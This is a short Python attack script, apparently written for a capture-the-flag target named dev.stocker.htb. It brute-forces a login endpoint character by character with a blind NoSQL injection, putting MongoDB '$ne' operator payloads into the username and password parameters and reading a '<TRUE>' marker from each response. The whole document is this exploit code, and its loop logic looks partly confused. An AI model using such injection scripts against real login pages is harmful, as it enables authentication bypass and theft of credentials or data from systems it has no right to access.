import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = "username[$ne]=toto&password[$ne]=toto"
for i in range(21):
    print("[i] Looking for char number "+str(i+1))
    for char in alphabet:
        r = requests.get("http://dev.stocker.htb/login?param=^"+flag+char)
        if ("<TRUE>" in r.text):
            flag += char
            print("[+] Flag: "+flag)
            break